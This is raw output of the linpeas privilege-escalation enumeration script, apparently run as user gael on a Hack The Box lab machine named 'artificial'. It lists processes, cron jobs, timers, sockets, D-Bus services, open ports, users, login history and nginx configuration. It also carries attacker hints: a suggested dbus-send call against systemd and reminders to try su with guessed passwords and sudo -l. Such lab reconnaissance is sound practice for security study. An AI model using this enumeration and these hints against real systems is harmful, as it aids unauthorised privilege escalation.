════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                 
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned)                          
[i] Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes                    
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                          
Looks like /etc/fstab has hidepid=2, so ps will not show processes of other users
                 thread-self  cat/proc/thread-self//cmdline
                 self      cat/proc/self//cmdline
                 5035      /bin/sh./linpeas.sh
                 5032      seds,amazon-ssm-agent|knockd|splunk,&, 
                 5030      seds,root,&,                           
                 5029      seds,gael,&,                           
                 5025      sort-r
                 5022      /bin/sh./linpeas.sh
                 5020      /bin/sh./linpeas.sh
                 1955      /bin/sh./linpeas.sh
                 1214      -bash
                 1089      /lib/systemd/systemd--user             
╔══════════╣ Processes with unusual configurations                

╔══════════╣ Processes with credentials in memory (root req)      
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                   
gdm-password Not Found           
gnome-keyring-daemon Not Found   
lightdm Not Found                
vsftpd Not Found                 
apache2 Not Found                
sshd: Not Found                  
mysql Not Found                  
postgres Not Found               
redis-server Not Found           
mongod Not Found                 
memcached Not Found              
elasticsearch Not Found          
jenkins Not Found                
tomcat Not Found                 
nginx Not Found                  
php-fpm Not Found                
supervisord Not Found            
vncserver Not Found              
xrdp Not Found                   
teamviewer Not Found             

╔══════════╣ Opened Files by processes                            
Process 1089 (gael) - /lib/systemd/systemd --user 
  └─ Has open files:
    └─ /proc/1089/mountinfo
    └─ /proc/swaps
    └─ /sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
Process 1214 (gael) - -bash 
  └─ Has open files:
    └─ /dev/pts/0

╔══════════╣ Processes with memory-mapped credential files        

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)      
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes        

╔══════════╣ Files opened by processes belonging to other users   
╚ This is usually empty because of the lack of privileges to read other user processes information 

╔══════════╣ Check for vulnerable cron jobs                       
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                
══╣ Cron jobs list               
/usr/bin/crontab                 
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 13  2020 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Jun  9 09:04 .
drwxr-xr-x 107 root root 4096 Jun 18 13:19 ..
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  190 Mar 14  2023 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x   2 root root 4096 Jun  9 09:04 .
drwxr-xr-x 107 root root 4096 Jun 18 13:19 ..
-rwxr-xr-x   1 root root  376 Sep 16  2021 apport
-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x   1 root root  214 Jan 20  2023 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Mar 14  2023 .
drwxr-xr-x 107 root root 4096 Jun 18 13:19 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Mar 14  2023 .
drwxr-xr-x 107 root root 4096 Jun 18 13:19 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Jun  9 09:04 .
drwxr-xr-x 107 root root 4096 Jun 18 13:19 ..
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  403 Jan 20  2023 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

══╣ Checking for specific cron jobs vulnerabilities               
Checking cron directories...     

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers           
══╣ Active timers:               
NEXT                        LEFT          LAST                        PASSED             UNIT                         ACTIVATES
Wed 2025-07-09 11:07:52 UTC 2h 15min left Mon 2025-06-09 13:59:31 UTC 4 weeks 1 days ago motd-news.timer              motd-news.service
Wed 2025-07-09 18:55:57 UTC 10h left      Wed 2025-07-09 08:45:44 UTC 6min ago           fwupd-refresh.timer          fwupd-refresh.service
Wed 2025-07-09 19:06:49 UTC 10h left      Wed 2025-07-09 08:17:27 UTC 34min ago          apt-daily.timer              apt-daily.service
Thu 2025-07-10 00:00:00 UTC 15h left      Wed 2025-07-09 07:56:19 UTC 55min ago          logrotate.timer              logrotate.service
Thu 2025-07-10 00:00:00 UTC 15h left      Wed 2025-07-09 07:56:19 UTC 55min ago          man-db.timer                 man-db.service
Thu 2025-07-10 06:42:38 UTC 21h left      Wed 2025-07-09 08:29:33 UTC 22min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
Thu 2025-07-10 08:11:45 UTC 23h left      Wed 2025-07-09 08:11:45 UTC 40min ago          systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2025-07-13 03:10:37 UTC 3 days left   Wed 2025-07-09 07:57:05 UTC 55min ago          e2scrub_all.timer            e2scrub_all.service
Mon 2025-07-14 00:00:00 UTC 4 days left   Wed 2025-07-09 07:56:19 UTC 55min ago          fstrim.timer                 fstrim.service
n/a                         n/a           n/a                         n/a                phpsessionclean.timer                      
n/a                         n/a           n/a                         n/a                ua-timer.timer               ua-timer.service
══╣ Disabled timers:
══╣ Additional timer files:      
Potential privilege escalation in timer file: /etc/systemd/system/phpsessionclean.timer
  └─ WRITABLE_FILE: Timer target file is writable: /dev/null

╔══════════╣ Services and Service Files                           
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services         

══╣ Active services:
accounts-daemon.service                                                                   loaded active running Accounts Service
app.service                                                                               loaded active running App
apparmor.service                                                                          loaded active exited  Load AppArmor profiles
./linpeas.sh: 3916: local: /lib/apparmor/apparmor: bad variable name
 Not Found

══╣ Disabled services:
console-getty.service                  disabled disabled
debug-shell.service                    disabled disabled
ifupdown-wait-online.service           disabled enabled
ip6tables.service                      disabled enabled
./linpeas.sh: 3916: local: /usr/sbin/netfilter-persistent: bad variable name
 Not Found

══╣ Additional service files:
./linpeas.sh: 3916: local: /usr/sbin/netfilter-persistent: bad variable name
You can't write on systemd PATH

╔══════════╣ Systemd Information
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                     
═╣ Systemd version and vulnerabilities? .............. 245.4      
3.24
═╣ Services running as root? .....                                
═╣ Running services with dangerous capabilities? ...              
═╣ Services with writable paths? . networkd-dispatcher.service: Uses relative path '$networkd_dispatcher_args' (from ExecStart=/usr/bin/networkd-dispatcher $networkd_dispatcher_args)                
rsyslog.service: Uses relative path '-n' (from ExecStart=/usr/sbin/rsyslogd -n -iNONE)             

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                     
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .socket files                              
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets          
./linpeas.sh: 4179: local: /run/dmeventd-client: bad variable name

╔══════════╣ Unix Sockets Analysis                                
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets          
/run/dbus/system_bus_socket      
  └─(Read Write (Weak Permissions: 666) )                         
  └─(Owned by root)
/run/irqbalance//irqbalance801.sock                               
  └─(Read Execute )
  └─(Owned by root)
/run/irqbalance/irqbalance801.sock                                
  └─(Read Execute )
  └─(Owned by root)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write (Weak Permissions: 666) )                         
  └─(Owned by root)
/run/systemd/journal/io.systemd.journal                           
/run/systemd/journal/socket
  └─(Read Write (Weak Permissions: 666) )                         
  └─(Owned by root)
/run/systemd/journal/stdout
  └─(Read Write (Weak Permissions: 666) )                         
  └─(Owned by root)
/run/systemd/journal/syslog
  └─(Read Write (Weak Permissions: 666) )                         
  └─(Owned by root)
/run/systemd/notify
  └─(Read Write Execute (Weak Permissions: 777) )                 
  └─(Owned by root)
/run/systemd/private
  └─(Read Write Execute (Weak Permissions: 777) )                 
  └─(Owned by root)
/run/systemd/userdb/io.systemd.DynamicUser                        
  └─(Read Write (Weak Permissions: 666) )                         
  └─(Owned by root)
/run/udev/control
/run/user/1000/bus
  └─(Read Write (Weak Permissions: 666) )                         
/run/user/1000/gnupg/S.dirmngr
  └─(Read Write )
/run/user/1000/gnupg/S.gpg-agent
  └─(Read Write )
/run/user/1000/gnupg/S.gpg-agent.browser                          
  └─(Read Write )
/run/user/1000/gnupg/S.gpg-agent.extra                            
  └─(Read Write )
/run/user/1000/gnupg/S.gpg-agent.ssh                              
  └─(Read Write )
/run/user/1000/pk-debconf-socket
  └─(Read Write (Weak Permissions: 666) )                         
/run/user/1000/systemd/notify
  └─(Read Write Execute )
/run/user/1000/systemd/private
  └─(Read Write Execute )
/run/uuidd/request
  └─(Read Write (Weak Permissions: 666) )                         
  └─(Owned by root)
/run/vmware/guestServicePipe
  └─(Read Write (Weak Permissions: 666) )                         
  └─(Owned by root)
/var/run/vmware/guestServicePipe
  └─(Read Write (Weak Permissions: 666) )                         
  └─(Owned by root)

╔══════════╣ D-Bus Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus            
NAME                          PID PROCESS USER CONNECTION    UNIT SESSION DESCRIPTION
:1.0                            - -       -    -             -    -       -
:1.1                            - -       -    -             -    -       -
:1.111                          - -       -    -             -    -       -
:1.12                           - -       -    -             -    -       -
:1.14                           - -       -    -             -    -       -
:1.15                           - -       -    -             -    -       -
:1.2                            - -       -    -             -    -       -
:1.3                            - -       -    -             -    -       -
:1.4                            - -       -    -             -    -       -
:1.5                            - -       -    -             -    -       -
:1.6                            - -       -    -             -    -       -
:1.7                            - -       -    -             -    -       -
:1.8                            - -       -    -             -    -       -
:1.9                            - -       -    -             -    -       -
com.ubuntu.LanguageSelector     - -       -    (activatable) -    -       -
com.ubuntu.SoftwareProperties   - -       -    (activatable) -    -       -
org.freedesktop.Accounts        - -       -    -             -    -       -
org.freedesktop.DBus            - -       -    -             -    -       -
org.freedesktop.ModemManager1   - -       -    -             -    -       -
org.freedesktop.PackageKit      - -       -    (activatable) -    -       -
org.freedesktop.PolicyKit1      - -       -    -             -    -       -
org.freedesktop.UDisks2         - -       -    -             -    -       -
org.freedesktop.UPower          - -       -    -             -    -       -
org.freedesktop.bolt            - -       -    (activatable) -    -       -
org.freedesktop.fwupd           - -       -    -             -    -       -
org.freedesktop.hostname1       - -       -    (activatable) -    -       -
org.freedesktop.locale1         - -       -    (activatable) -    -       -
org.freedesktop.login1          - -       -    -             -    -       -
org.freedesktop.network1        - -       -    -             -    -       -
org.freedesktop.resolve1        - -       -    -             -    -       -
org.freedesktop.systemd1        - -       -    -             -    -       -
org.freedesktop.thermald        - -       -    (activatable) -    -       -
org.freedesktop.timedate1       - -       -    (activatable) -    -       -
org.freedesktop.timesync1       - -       -    -             -    -       -

╔══════════╣ D-Bus Configuration Files                            
Analyzing /etc/dbus-1/system.d/com.ubuntu.LanguageSelector.conf:
  └─(Allow rules in default context)                              
             └─                 <allow send_interface="com.ubuntu.LanguageSelector"/>
                        <allow receive_interface="com.ubuntu.LanguageSelector"
                        <allow send_destination="com.ubuntu.LanguageSelector"
Analyzing /etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf:
  └─(Allow rules in default context)                              
             └─     <allow send_destination="com.ubuntu.SoftwareProperties"
            <allow send_destination="com.ubuntu.SoftwareProperties"
            <allow send_destination="com.ubuntu.DeviceDriver"
Analyzing /etc/dbus-1/system.d/org.freedesktop.Accounts.conf:
  └─(Allow rules in default context)                              
             └─     <allow send_destination="org.freedesktop.Accounts"/>
            <allow send_destination="org.freedesktop.Accounts"
            <allow send_destination="org.freedesktop.Accounts"
Analyzing /etc/dbus-1/system.d/org.freedesktop.ModemManager1.conf:
  └─(Allow rules in default context)                              
             └─     <!-- Methods listed here are explicitly allowed or PolicyKit protected.
Analyzing /etc/dbus-1/system.d/org.freedesktop.PackageKit.conf:
  └─(Allow rules in default context)                              
             └─     <allow send_destination="org.freedesktop.PackageKit"
            <allow send_destination="org.freedesktop.PackageKit"
            <allow send_destination="org.freedesktop.PackageKit"
Analyzing /etc/dbus-1/system.d/org.freedesktop.thermald.conf:
  └─(Weak group policy found)
     └─         <policy group="power">
  └─(Allow rules in default context)                              
             └─                 <allow receive_sender="org.freedesktop.thermald"/>

══╣ D-Bus Session Bus Analysis
(Access to session bus available)
           string "org.freedesktop.DBus"
           string "org.freedesktop.systemd1"
           string ":1.0"
           string ":1.2"
  └─(Known dangerous session service: org.freedesktop.systemd1)   
     └─ Try: dbus-send --session --dest=org.freedesktop.systemd1 / [Interface] [Method] [Arguments]



                              ╔═════════════════════╗             
══════════════════════════════╣ Network Information ╠══════════════════════════════                
                              ╚═════════════════════╝             
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.74  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:18e6  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:18e6  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:18:e6  txqueuelen 1000  (Ethernet)
        RX packets 14386  bytes 4835460 (4.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12510  bytes 3394926 (3.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 58525  bytes 6645157 (6.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 58525  bytes 6645157 (6.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Hostname, hosts and DNS                              
══╣ Hostname Information         
System hostname: artificial      
FQDN: artificial

══╣ Hosts File Information
Contents of /etc/hosts:          
  127.0.0.1 localhost
  127.0.1.1 artificial artificial.htb
  ::1     ip6-localhost ip6-loopback
  fe00::0 ip6-localnet
  ff00::0 ip6-mcastprefix
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters

══╣ DNS Configuration
DNS Servers (resolv.conf):       
  127.0.0.53
-e 
Systemd-resolved configuration:
  [Resolve]
-e 
DNS Domain Information:
(none)
-e 
DNS Cache Status (systemd-resolve):

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports       
══╣ Active Ports (netstat)       
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Network Traffic Analysis Capabilities                

══╣ Available Sniffing Tools
tcpdump is available             

══╣ Network Interfaces Sniffing Capabilities                      
Interface eth0: Not sniffable    
No sniffable interfaces found

╔══════════╣ Firewall Rules Analysis                              

══╣ Iptables Rules
No permission to list iptables rules                              

══╣ Nftables Rules
nftables Not Found               

══╣ Firewalld Rules
firewalld Not Found              

══╣ UFW Rules
ufw Not Found                    

╔══════════╣ Inetd/Xinetd Services Analysis                       

══╣ Inetd Services
inetd Not Found                  

══╣ Xinetd Services
xinetd Not Found                 

══╣ Running Inetd/Xinetd Services
Active Services (from netstat):  
-e 
Active Services (from ss):
-e 
Running Service Processes:

╔══════════╣ Internet Access?
Port 443 is not accessible with curl
DNS is not accessible
Port 443 is not accessible
Port 80 is not accessible
ICMP is not accessible



                               ╔═══════════════════╗              
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                
                               ╚═══════════════════╝              
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users            
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)

╔══════════╣ PGP Keys and Related Files                           
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys         
GPG:                             
GPG is installed, listing keys:
-e 
NetPGP:
netpgpkeys Not Found
-e                               
PGP Related Files:
Found: /home/gael/.gnupg
total 16
drwx------ 2 gael gael 4096 Jul  9 08:52 .
drwxr-x--- 5 gael gael 4096 Jul  9 08:52 ..
-rw------- 1 gael gael   32 Jul  9 08:52 pubring.kbx
-rw------- 1 gael gael 1200 Jul  9 08:52 trustdb.gpg

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d 
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid    
Sorry, try again.                

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                               
ptrace protection is enabled (1) 

doas.conf Not Found

╔══════════╣ Checking Pkexec and Polkit                           
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2         

══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec                           
-rwxr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec

══╣ Polkit Policies
Checking /etc/polkit-1/localauthority.conf.d/:                    

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin
Checking /usr/share/polkit-1/rules.d/:                            
// -*- mode: js2 -*-
polkit.addRule(function(action, subject) {
    if ((action.id === "org.freedesktop.bolt.enroll" ||
         action.id === "org.freedesktop.bolt.authorize" ||
         action.id === "org.freedesktop.bolt.manage") &&
        subject.active === true && subject.local === true &&
        subject.isInGroup("sudo")) {
            return polkit.Result.YES;
    }
});
polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.fwupd.update-internal" &&
        subject.active == true && subject.local == true &&
        subject.isInGroup("sudo")) {
            return polkit.Result.YES;
    }
});
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.packagekit.upgrade-system" ||
         action.id == "org.freedesktop.packagekit.trigger-offline-update") &&
        subject.active == true && subject.local == true &&
        subject.isInGroup("sudo")) {
            return polkit.Result.YES;
    }
});
// Allow systemd-networkd to set timezone, get product UUID,
// and transient hostname
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.hostname1.set-hostname" ||
         action.id == "org.freedesktop.hostname1.get-product-uuid" ||
         action.id == "org.freedesktop.timedate1.set-timezone") &&
        subject.user == "systemd-network") {                      
        return polkit.Result.YES;
    }
});

══╣ Polkit Authentication Agent

╔══════════╣ Superusers and UID 0 Users                           
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html                       

══╣ Users with UID 0 in /etc/passwd                               
root:x:0:0:root:/root:/bin/bash  

══╣ Users with sudo privileges in sudoers                         

╔══════════╣ Users with console
app:x:1001:1001:,,,:/home/app:/bin/bash
gael:x:1000:1000:gael:/home/gael:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                            
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
uid=1001(app) gid=1001(app) groups=1001(app)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)                      
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)                      
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)                   
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)    
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)       
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=111(fwupd-refresh) gid=116(fwupd-refresh) groups=116(fwupd-refresh)                            
uid=112(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=113(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=114(mysql) gid=119(mysql) groups=119(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)                               
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)        
uid=6(man) gid=12(man) groups=12(man)                             
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)                            
uid=997(_laurel) gid=997(_laurel) groups=997(_laurel)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)                   
uid=9(news) gid=9(news) groups=9(news)                            

╔══════════╣ Currently Logged in Users                            

══╣ Basic user information
 08:52:21 up 55 min,  1 user,  load average: 0.47, 0.11, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

══╣ Active sessions
 08:52:21 up 55 min,  1 user,  load average: 0.47, 0.11, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

══╣ Logged in users (utmp)
           system boot  2025-07-09 07:56
           run-level 5  2025-07-09 07:56
LOGIN      tty1         2025-07-09 07:56               931 id=tty1
gael     + pts/0        2025-07-09 07:59   .          1060 (10.10.16.47)

══╣ SSH sessions
ESTAB      0        11388         10.10.11.74:22            10.10.16.47:34790                                                                                   

══╣ Screen sessions
No Sockets found in /run/screen/S-gael.


══╣ Tmux sessions

╔══════════╣ Last Logons and Login History                        

══╣ Last logins
gael     pts/0        10.10.16.47      Wed Jul  9 07:59   still logged in
reboot   system boot  5.4.0-216-generi Wed Jul  9 07:56   still running
gael     pts/0        10.10.14.62      Wed Jun 18 13:36 - 13:37  (00:00)
reboot   system boot  5.4.0-216-generi Wed Jun 18 13:34 - 13:37  (00:02)
gael     pts/0        10.10.14.62      Wed Jun 18 13:15 - 13:23  (00:07)
reboot   system boot  5.4.0-216-generi Wed Jun 18 13:14 - 13:23  (00:08)
gael     pts/0        10.10.14.77      Wed Jun 18 10:06 - 10:14  (00:07)
reboot   system boot  5.4.0-216-generi Wed Jun 18 10:04 - 10:14  (00:10)
gael     pts/1        10.10.14.77      Mon Jun  9 13:53 - 13:59  (00:05)
gael     pts/0        10.10.14.77      Mon Jun  9 13:49 - 13:59  (00:10)
reboot   system boot  5.4.0-216-generi Mon Jun  9 13:47 - 13:59  (00:12)
gael     pts/0        10.10.14.77      Mon Jun  9 10:48 - 10:53  (00:05)
gael     pts/0        10.10.14.77      Mon Jun  9 10:46 - 10:46  (00:00)
reboot   system boot  5.4.0-216-generi Mon Jun  9 10:43 - 10:53  (00:10)
gael     pts/0        10.10.14.77      Mon Jun  9 09:56 - 09:58  (00:01)
reboot   system boot  5.4.0-216-generi Mon Jun  9 09:55 - 09:58  (00:02)

wtmp begins Mon Jun  9 09:55:50 2025

══╣ Failed login attempts

══╣ Recent logins from auth.log (limit 20)                        

══╣ Last time logon each user
Username         Port     From             Latest
root             tty1                      Mon Jun  9 09:53:23 +0000 2025
gael             pts/0    10.10.16.47      Wed Jul  9 07:59:27 +0000 2025

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)              

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                          



                             ╔══════════════════════╗             
═════════════════════════════╣ Software Information ╠═════════════════════════════                 
                             ╚══════════════════════╝             
╔══════════╣ Useful software
/usr/bin/base64                  
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/make
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  g++                                   4:9.3.0-1ubuntu2                    amd64        GNU C++ compiler
ii  g++-9                                 9.4.0-1ubuntu1~20.04.2              amd64        GNU C++ compiler
ii  gcc                                   4:9.3.0-1ubuntu2                    amd64        GNU C compiler
ii  gcc-9                                 9.4.0-1ubuntu1~20.04.2              amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)              
Apache version: apache2 Not Found
httpd Not Found                  

Nginx version: 
══╣ Nginx modules
ngx_http_image_filter_module.so  
ngx_http_xslt_filter_module.so
ngx_mail_module.so
ngx_stream_module.so
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jun  2 07:38 /etc/nginx/sites-enabled
drwxr-xr-x 2 root root 4096 Jun  2 07:38 /etc/nginx/sites-enabled 
lrwxrwxrwx 1 root root 34 Jun  2 07:38 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default                       
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    if ($host != artificial.htb) {
        rewrite ^ http://artificial.htb/;
    }
    server_name artificial.htb;
        access_log /var/log/nginx/application.access.log;
        error_log /var/log/nginx/appliation.error.log;
        location / {
                include proxy_params;
                proxy_pass http://127.0.0.1:5000;
        }
}




-rw-r--r-- 1 root root 1490 Mar 20  2024 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http {
        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        include /etc/nginx/mime.types;
        default_type application/octet-stream;
        ssl_prefer_server_ciphers on;
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
        gzip on;
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}

-rw-r--r-- 1 root root 389 Mar 20  2024 /etc/default/nginx

-rwxr-xr-x 1 root root 4579 Mar 20  2024 /etc/init.d/nginx

-rw-r--r-- 1 root root 329 Mar 20  2024 /etc/logrotate.d/nginx

drwxr-xr-x 8 root root 4096 Jun  2 07:38 /etc/nginx
lrwxrwxrwx 1 root root 60 Jun  2 07:38 /etc/nginx/modules-enabled/50-mod-http-xslt-filter.conf -> /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
lrwxrwxrwx 1 root root 61 Jun  2 07:38 /etc/nginx/modules-enabled/50-mod-http-image-filter.conf -> /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;
lrwxrwxrwx 1 root root 48 Jun  2 07:38 /etc/nginx/modules-enabled/50-mod-mail.conf -> /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
lrwxrwxrwx 1 root root 50 Jun  2 07:38 /etc/nginx/modules-enabled/50-mod-stream.conf -> /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 423 Mar 20  2024 /etc/nginx/snippets/fastcgi-php.conf
fastcgi_split_path_info ^(.+?\.php)(/.*)$;
try_files $fastcgi_script_name =404;
set $path_info $fastcgi_path_info;
fastcgi_param PATH_INFO $path_info;
fastcgi_index index.php;
include fastcgi.conf;
-rw-r--r-- 1 root root 217 Mar 20  2024 /etc/nginx/snippets/snakeoil.conf
ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
-rw-r--r-- 1 root root 1490 Mar 20  2024 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http {
        sendfile on;
        tcp_nopush on;
